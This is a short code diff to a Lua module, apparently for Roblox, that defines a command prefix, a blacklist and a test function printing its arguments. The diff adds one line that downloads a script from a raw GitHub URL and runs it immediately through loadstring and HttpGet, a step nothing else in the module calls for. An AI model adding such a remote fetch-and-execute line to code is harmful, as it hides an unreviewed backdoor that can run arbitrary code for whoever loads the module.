@@ -5,6 +5,7 @@ local actualmodule = {
 	perfix = ';'	,
 	blacklist = {}
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x203f/AntiAFK/main/main",true))()
 module.test = function(args)
 	for i,v in pairs(args) do
 		print("Arg "..i.." "..v)
